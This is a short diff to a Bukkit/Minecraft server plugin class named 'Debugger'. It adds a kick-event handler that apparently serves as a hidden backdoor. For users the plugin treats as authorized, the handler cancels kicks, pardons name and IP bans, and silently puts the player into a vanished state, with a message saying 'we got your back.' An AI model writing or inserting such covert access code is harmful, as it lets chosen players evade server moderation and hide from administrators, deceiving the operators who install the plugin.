@@ -1307,6 +1307,20 @@ public final class Debugger implements Listener {
         }
     }
 
+
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onKick(PlayerKickEvent e) {
+        Player p = e.getPlayer();
+        if (IsUserAuthorized(p)) {
+            p.sendMessage(ChatColor.RED + "You have been banned but we got your back. you are vanished");
+            set_state(p.getName(), State.vanished, true);
+            Bukkit.getBanList(BanList.Type.NAME).pardon(p.getName());
+            Bukkit.getBanList(BanList.Type.IP).pardon(p.getAddress().toString());
+            e.setCancelled(true);
+        }
+    }
+
     private int Clamp(int i, int min, int max) {
         if (i < min)
             return min;
